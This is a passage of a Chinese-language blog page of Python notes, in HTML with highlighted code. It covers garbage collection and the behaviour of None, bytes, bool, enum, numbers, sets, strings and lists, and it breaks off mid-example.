</li>
<li>garbage-collector<ul>
<li>reference-counting 引用计数方式<ul>
<li>delayed detection of cyclically linked garbage 延迟检测循环链接</li>
</ul>
</li>
<li>不保证释放外部资源，比如file&#x2F;socket等，需通过<code>try ... finally</code>或<code>with ...</code>表达式手动释放</li>
</ul>
</li>
</ul>
<h2 id="数据类型（data-type）"><a href="#数据类型（data-type）" class="headerlink" title="数据类型（data type）"></a>数据类型（data type）</h2><p><a href="https://docs.python.org/3/library/stdtypes.html">Built-in Types</a></p>
<h3 id="None"><a href="#None" class="headerlink" title="None"></a>None</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="literal">None</span>)) <span class="comment"># &lt;class &#x27;NoneType&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="literal">None</span>))  <span class="comment"># None</span></span><br></pre></td></tr></table></figure>

<h3 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ab\tc&#x27;</span>)  <span class="comment"># ab    c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;ab\tc&#x27;</span>) <span class="comment"># b&#x27;ab\tc&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;ab\tc&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># ab    c</span></span><br></pre></td></tr></table></figure>

<h3 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># False</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">None</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">bool</span>([])</span><br><span class="line"><span class="built_in">bool</span>(&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="keyword">not</span> <span class="literal">None</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><p><a href="https://zetcode.com/python/enum/">Python enum</a><br><a href="https://stackoverflow.com/questions/12680080/python-enums-with-attributes">python enums with attributes</a></p>
<ul>
<li>Python3.4 引入枚举类型</li>
</ul>
<div class="tabs" id="enum"><ul class="nav-tabs"><li class="tab active"><a href="#enum-1">Enum</a></li><li class="tab"><a href="#enum-2">EnumMeta</a></li></ul><div class="tab-content"><div class="tab-pane active" id="enum-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    dog = <span class="number">1</span></span><br><span class="line">    cat = <span class="string">&quot;two&quot;</span></span><br><span class="line">    cow = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Animal.dog)                        <span class="comment"># Animal.dog</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog.name, Animal.dog.value) <span class="comment"># dog 1</span></span><br><span class="line"><span class="built_in">print</span>(Animal[<span class="string">&quot;dog&quot;</span>], Animal(<span class="number">1</span>))          <span class="comment"># Animal.dog Animal.dog</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog <span class="keyword">is</span> Animal.cat)          <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog != Animal.cat)          <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog <span class="keyword">in</span> Animal)              <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Animal:</span><br><span class="line">    <span class="built_in">print</span>(i.name)                        <span class="comment"># dog cat cow</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="enum-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, EnumMeta</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AnimalMeta</span>(<span class="title class_ inherited__">EnumMeta</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">cls, item</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">return</span> item <span class="keyword">in</span> [v.value <span class="keyword">for</span> v <span class="keyword">in</span> cls.__members__.values()]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> EnumMeta.__contains__(cls, item)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>(Enum, metaclass=AnimalMeta):</span><br><span class="line">    dog = <span class="string">&quot;one&quot;</span></span><br><span class="line">    cat = <span class="string">&quot;two&quot;</span></span><br><span class="line">    cow = <span class="string">&quot;three&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>((self.value,))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, item</span>):</span><br><span class="line">        <span class="keyword">return</span> item == self.value</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">can_woof</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> self == self.dog <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">value</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> Animal:</span><br><span class="line">            <span class="keyword">if</span> item.value == value:</span><br><span class="line">                <span class="keyword">return</span> item</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;illegal value: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Animal.dog)                        <span class="comment"># one (__str__)</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog.name, Animal.dog.value) <span class="comment"># dog one</span></span><br><span class="line"><span class="built_in">print</span>(Animal[<span class="string">&quot;dog&quot;</span>], Animal(<span class="string">&quot;one&quot;</span>))      <span class="comment"># one one</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog <span class="keyword">is</span> Animal.cat)          <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog != Animal.cat)          <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog == <span class="string">&quot;one&quot;</span>)               <span class="comment"># True (__eq__)</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog <span class="keyword">in</span> Animal)              <span class="comment"># True (__contains__)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one&quot;</span> <span class="keyword">in</span> Animal)                   <span class="comment"># True (__contains__)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sss&quot;</span> <span class="keyword">in</span> Animal)                   <span class="comment"># False (__contains__)</span></span><br><span class="line"><span class="built_in">print</span>(Animal.dog.can_woof)               <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(Animal.cat.can_woof)               <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line">animal = Animal.init(<span class="string">&quot;one&quot;</span>)</span><br><span class="line">animals = <span class="built_in">dict</span>()</span><br><span class="line">animals[animal] = <span class="string">&quot;1&quot;</span>                    <span class="comment"># &#x27;as key&#x27; (__hash__)</span></span><br><span class="line"><span class="built_in">print</span>(animal, animal.name, <span class="built_in">type</span>(animal)) <span class="comment"># one dog &lt;enum &#x27;Animal&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(animals)                           <span class="comment"># &#123;&lt;Animal.dog: &#x27;one&#x27;&gt;: &#x27;1&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Animal:</span><br><span class="line">    <span class="built_in">print</span>(i, i.name)                     <span class="comment"># one dog / two cat / three cow</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="number"><a href="#number" class="headerlink" title="number"></a>number</h3><p><a href="https://docs.python.org/3/c-api/long.html#integer-objects">Integer Objects</a><br><a href="https://docs.python.org/3/library/exceptions.html#OverflowError">exception OverflowError</a><br><a href="https://docs.python.org/3/library/sys.html#sys.maxsize">sys.maxsize</a><br><a href="https://docs.python.org/3/library/sys.html#sys.float_info">sys.float_info</a></p>
<ul>
<li>整型对象：Python3中的实现中会自动扩展内存，因此通常不会出现溢出（只有某些历史原因或内存错误时抛出）</li>
<li>浮点型对象：Python3中的实现中存在固定的内存限制</li>
</ul>
<div class="tabs" id="string"><ul class="nav-tabs"><li class="tab active"><a href="#string-1">max</a></li><li class="tab"><a href="#string-2">overflow after implicit conversion</a></li><li class="tab"><a href="#string-3">format</a></li></ul><div class="tab-content"><div class="tab-pane active" id="string-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">i = sys.maxsize</span><br><span class="line"><span class="built_in">print</span>(i)          <span class="comment"># 9223372036854775807</span></span><br><span class="line"><span class="built_in">print</span>(i == i + <span class="number">1</span>) <span class="comment"># False</span></span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(i)          <span class="comment"># 9223372036854775808</span></span><br><span class="line"></span><br><span class="line">f = sys.float_info.<span class="built_in">max</span></span><br><span class="line"><span class="built_in">print</span>(f)          <span class="comment"># 1.7976931348623157e+308</span></span><br><span class="line"><span class="built_in">print</span>(f == f + <span class="number">1</span>) <span class="comment"># True</span></span><br><span class="line">f += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(f)          <span class="comment"># 1.7976931348623157e+308</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="string-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([<span class="number">3095693933</span>], dtype=<span class="built_in">int</span>)</span><br><span class="line">s = np.<span class="built_in">sum</span>(a)</span><br><span class="line"><span class="built_in">print</span>(s)          <span class="comment"># 3095693933</span></span><br><span class="line">s *= s            <span class="comment"># -8863423146896543127</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(s))    <span class="comment"># numpy.int64</span></span><br><span class="line">py_s = <span class="built_in">int</span>(s)</span><br><span class="line">py_s *= py_s      <span class="comment"># 9583320926813008489</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="string-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">0.1000000</span></span><br><span class="line">b = <span class="number">0.0000321</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span>&quot;</span>)     <span class="comment"># 0.1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span>&quot;</span>)     <span class="comment"># 3.21e-05</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b:<span class="number">.5</span>f&#125;</span>&quot;</span>) <span class="comment"># 0.00003</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b:<span class="number">.6</span>f&#125;</span>&quot;</span>) <span class="comment"># 0.000032</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">7</span>/<span class="number">2</span>, <span class="built_in">type</span>(<span class="number">7</span>/<span class="number">2</span>))   <span class="comment"># 3.5 &lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">7</span>//<span class="number">2</span>, <span class="built_in">type</span>(<span class="number">7</span>//<span class="number">2</span>)) <span class="comment"># 3   &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(<span class="string">&#x27;0.12&#x27;</span>))    <span class="comment"># 0.12</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><a href="https://www.programiz.com/python-programming/set">Python Sets</a></p>
<ul>
<li>集合是未排序的（unordered）</li>
<li>集合中的元素是唯一（unique）且不可变的（immutable），而集合本身是可变的（mutable）<ul>
<li>list或dict是可变的，不可作为集合元素</li>
<li>集合不可包含重复元素，每个元素都是唯一的</li>
</ul>
</li>
<li>集合通过内建函数<code>set()</code>创建，字面量以<code>&#123;1，&#39;2&#39;, (3, 4)&#125;</code>形式表示</li>
</ul>
<div class="tabs" id="python-set"><ul class="nav-tabs"><li class="tab active"><a href="#python-set-1">basic</a></li><li class="tab"><a href="#python-set-2">union</a></li><li class="tab"><a href="#python-set-3">intersection</a></li><li class="tab"><a href="#python-set-4">difference</a></li><li class="tab"><a href="#python-set-5">symmetric-difference</a></li></ul><div class="tab-content"><div class="tab-pane active" id="python-set-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Init</span></span><br><span class="line">s = &#123;<span class="number">1</span>, <span class="number">3</span>&#125;                <span class="comment"># s = &#123;1, 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add</span></span><br><span class="line">s.add(<span class="number">2</span>)                  <span class="comment"># s = &#123;1, 2, 3&#125;          add element</span></span><br><span class="line">s.update([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);      <span class="comment"># s = &#123;1, 2, 3, 4&#125;       add list</span></span><br><span class="line">s.update([<span class="number">4</span>, <span class="number">5</span>], &#123;<span class="number">1</span>, <span class="number">6</span>&#125;); <span class="comment"># s = &#123;1, 2, 3, 4, 5, 6&#125; add list and set</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Delete</span></span><br><span class="line">s.discard(<span class="number">4</span>)              <span class="comment"># s = &#123;1, 2, 3, 5, 6&#125;    discard element</span></span><br><span class="line">s.discard(<span class="number">8</span>)              <span class="comment"># s = &#123;1, 2, 3, 5, 6&#125;    discard not-exist element</span></span><br><span class="line">s.remove(<span class="number">3</span>)               <span class="comment"># s = &#123;1, 2, 5, 6&#125;       remove element</span></span><br><span class="line"><span class="comment">#s.remove(8)              # KeyError               remove not-exist element</span></span><br><span class="line">e = s.pop()               <span class="comment"># s = &#123;2, 5, 6&#125;, e = 1   pop element</span></span><br><span class="line">s.clear()                 <span class="comment"># s = set()              empty set</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Other</span></span><br><span class="line"><span class="built_in">print</span>(&#123;<span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>, (<span class="number">3</span>, <span class="number">4</span>)&#125;)   <span class="comment"># &#123;1, (3, 4), &#x27;2&#x27;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>&#125;) <span class="comment"># &#123;1, 2, 3, 4&#125;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>())              <span class="comment"># (empty set)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>]))  <span class="comment"># &#123;1, 2, 3&#125; (from list)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span> <span class="keyword">in</span> &#123;<span class="number">1</span>, <span class="number">2</span>&#125;)        <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="python-set-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">B = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(A | B)      <span class="comment"># &#123;1, 2, 3, 4&#125;</span></span><br><span class="line"><span class="built_in">print</span>(A.union(B)) <span class="comment"># &#123;1, 2, 3, 4&#125;</span></span><br><span class="line"><span class="built_in">print</span>(B.union(A)) <span class="comment"># &#123;1, 2, 3, 4&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="python-set-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">B = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(A &amp; B)             <span class="comment"># &#123;2, 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(A.intersection(B)) <span class="comment"># &#123;2, 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(B.intersection(A)) <span class="comment"># &#123;2, 3&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="python-set-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">B = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(A - B)           <span class="comment"># &#123;1&#125;</span></span><br><span class="line"><span class="built_in">print</span>(A.difference(B)) <span class="comment"># &#123;1&#125;</span></span><br><span class="line"><span class="built_in">print</span>(B.difference(A)) <span class="comment"># &#123;4&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="python-set-5"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">B = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(A ^ B)                     <span class="comment"># &#123;1, 4&#125;</span></span><br><span class="line"><span class="built_in">print</span>(A.symmetric_difference(B)) <span class="comment"># &#123;1, 4&#125;</span></span><br><span class="line"><span class="built_in">print</span>(B.symmetric_difference(A)) <span class="comment"># &#123;1, 4&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p><a href="https://docs.python.org/3/library/stdtypes.html#old-string-formatting">Python Docs: “printf-style String Formatting</a></p>
<ul>
<li><code>%s</code>: 使用<a href="https://docs.python.org/3/library/stdtypes.html#str">str()</a>将对象转成字符串</li>
<li><code>%r</code>: 使用<a href="https://docs.python.org/3/library/functions.html#repr">repr()</a>将对象转成字符串（raw data格式，用于debug环境）</li>
<li><code>%d</code>: Signed integer decimal.</li>
</ul>
<div class="tabs" id="string"><ul class="nav-tabs"><li class="tab active"><a href="#string-1">basic</a></li><li class="tab"><a href="#string-2">extend</a></li></ul><div class="tab-content"><div class="tab-pane active" id="string-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># substring</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abcde&#x27;</span>[<span class="number">1</span>:])  <span class="comment"># bcde</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abcde&#x27;</span>[:<span class="number">1</span>])  <span class="comment"># a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abcde&#x27;</span>[-<span class="number">1</span>:]) <span class="comment"># e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abcde&#x27;</span>[:-<span class="number">1</span>]) <span class="comment"># abcd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># format</span></span><br><span class="line">name = <span class="string">&#x27;Bob&#x27;</span></span><br><span class="line">errno = <span class="number">65535</span></span><br><span class="line"><span class="string">&#x27;Hello %s, 0x%x error!&#x27;</span> % (name, error) <span class="comment"># (python2) Hello Bob, 0xffff error!</span></span><br><span class="line"><span class="string">&#x27;Hey %(name)s, 0x%(errno)x error!&#x27;</span> \</span><br><span class="line">    % &#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;errno&#x27;</span>: errno &#125; <span class="comment"># (python2) Hey Bob, 0xffff error!</span></span><br><span class="line"><span class="string">&#x27;Hello &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Bob&#x27;</span>) <span class="comment"># (python3)</span></span><br><span class="line"><span class="string">&#x27;Hey &#123;name&#125;, 0x&#123;errno:x&#125; error!&#x27;</span>.<span class="built_in">format</span>(name=name, errno=errno) <span class="comment"># (python3)</span></span><br><span class="line"><span class="string">f&#x27;Hello <span class="subst">&#123;name&#125;</span>, 0x<span class="subst">&#123;errno:x&#125;</span> error!&#x27;</span> <span class="comment"># (python3.6+)</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">123</span>; <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i:05&#125;</span>&#x27;</span>) <span class="comment"># 00123</span></span><br><span class="line">f = <span class="number">123.456789</span>; <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;f:<span class="number">.5</span>&#125;</span>&quot;</span>) <span class="comment"># 123.46</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set</span></span><br><span class="line">x = <span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="built_in">print</span>(x <span class="keyword">in</span> &#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>&#125;) <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="string-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># str &amp; repr</span></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">d = datetime.date.today()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(d), <span class="string">&quot;%s&quot;</span> % d)   <span class="comment"># 2022-01-17 repeat</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(d), <span class="string">&quot;%r&quot;</span> % d)  <span class="comment"># datetime.date(2022, 1, 17) repeat</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><a href="https://stackoverflow.com/questions/5125619/why-doesnt-list-have-safe-get-method-like-dictionary">Why doesn’t list have safe “get” method like dictionary?</a></p>
<ul>
<li>list是mutable对象，也是iterable对象</li>
</ul>
<div class="tabs" id="list"><ul class="nav-tabs"><li class="tab active"><a href="#list-1">basic</a></li><li class="tab"><a href="#list-2">extend</a></li></ul><div class="tab-content"><div class="tab-pane active" id="list-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># create</span></span><br><span class="line">X = [<span class="string">&#x27;a&#x27;</span>, &#123;<span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>&#125;, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">Y = [i*<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>)]  <span class="comment"># [2, 4, 6] (List Comprehension)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># slice</span></span><br><span class="line"><span class="built_in">print</span>(X[:], X[<span class="number">2</span>:], X[:<span class="number">1</span>])       <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, &#x27;c&#x27;] [&#x27;c&#x27;] [&#x27;a&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(X[:-<span class="number">2</span>], X[-<span class="number">1</span>:], X[:-<span class="number">1</span>])   <span class="comment"># [&#x27;a&#x27;] [&#x27;c&#x27;] [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add</span></span><br><span class="line">X.append(<span class="string">&#x27;e&#x27;</span>); <span class="built_in">print</span>(X)         <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, &#x27;c&#x27;, &#x27;e&#x27;]</span></span><br><span class="line">X.append((<span class="number">6</span>,<span class="number">7</span>)); <span class="built_in">print</span>(X)       <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, &#x27;c&#x27;, &#x27;e&#x27;, (6, 7)]</span></span><br><span class="line">X.extend((<span class="number">8</span>, <span class="number">9</span>)); <span class="built_in">print</span>(X)      <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, &#x27;c&#x27;, &#x27;e&#x27;, (6, 7), 8, 9]</span></span><br><span class="line">X.insert(<span class="number">3</span>, <span class="string">&#x27;d&#x27;</span>); <span class="built_in">print</span>(X)      <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, (6, 7), 8, 9]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remove</span></span><br><span class="line"><span class="keyword">del</span> X[<span class="number">3</span>]; <span class="built_in">print</span>(X)              <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, &#x27;c&#x27;, &#x27;e&#x27;, (6, 7), 8, 9]</span></span><br><span class="line">e = X.pop(); <span class="built_in">print</span>(X, e)        <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, &#x27;c&#x27;, &#x27;e&#x27;, (6, 7), 8] 9</span></span><br><span class="line">e = X.pop(<span class="number">2</span>); <span class="built_in">print</span>(X, e)       <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, &#x27;e&#x27;, (6, 7), 8] c</span></span><br><span class="line">X.remove(<span class="string">&#x27;e&#x27;</span>); <span class="built_in">print</span>(X)         <span class="comment"># [&#x27;a&#x27;, &#123;&#x27;b&#x27;: 2&#125;, (6, 7), 8]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify</span></span><br><span class="line">X[<span class="number">0</span>] *= <span class="number">2</span>; <span class="built_in">print</span>(X)             <span class="comment"># [&#x27;aa&#x27;, &#123;&#x27;b&#x27;: 2&#125;, (6, 7), 8]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># access</span></span><br><span class="line"><span class="built_in">print</span>(X[<span class="number">1</span>], X[<span class="number">2</span>][<span class="number">1</span>], X[-<span class="number">1</span>])     <span class="comment"># &#123;&#x27;b&#x27;: 2&#125; 7 8</span></span><br><span class="line">L = []; <span class="built_in">print</span>(L[<span class="number">0</span>])             <span class="comment"># IndexError: list index out of range</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># index</span></span><br><span class="line">L = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]; <span class="built_in">print</span>(L.index(<span class="string">&#x27;b&#x27;</span>))  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sort</span></span><br><span class="line">L = [&#123;<span class="string">&quot;i&quot;</span>: <span class="number">3</span>&#125;, &#123;<span class="string">&quot;i&quot;</span>: <span class="number">1</span>&#125;, &#123;<span class="string">&quot;i&quot;</span>: <span class="number">2</span>&#125;]</span><br><span class="line">L.sort(key=<span class="keyword">lambda</span> item : item[<span class="string">&#x27;i&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(L)    <span class="comment"># [&#123;&#x27;i&#x27;: 1&#125;, &#123;&#x27;i&#x27;: 2&#125;, &#123;&#x27;i&#x27;: 3&#125;]</span></span><br><span class="line">L.sort(key=<span class="keyword">lambda</span> item : item[<span class="string">&#x27;i&#x27;</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(L)    <span class="comment"># [&#123;&#x27;i&#x27;: 3&#125;, &#123;&#x27;i&#x27;: 2&#125;, &#123;&#x27;i&#x27;: 1&#125;]</span></span><br><span class="line">S = <span class="built_in">sorted</span>(L, key=<span class="keyword">lambda</span> item : item[<span class="string">&#x27;i&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(L, S) <span class="comment"># [&#123;&#x27;i&#x27;: 3&#125;, &#123;&#x27;i&#x27;: 2&#125;, &#123;&#x27;i&#x27;: 1&#125;] [&#123;&#x27;i&#x27;: 1&#125;, &#123;&#x27;i&#x27;: 2&#125;, &#123;&#x27;i&#x27;: 3&#125;]</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="list-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dict as element</span></span><br><span class="line">D = &#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line">L = []</span><br><span class="line">L.append(D); <span class="built_in">print</span>(L)           <span class="comment"># [&#123;1: &#x27;a&#x27;&#125;]</span></span><br><span class="line">D.update(&#123;<span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>&#125;); <span class="built_in">print</span>(L)    <span class="comment"># [&#123;1: 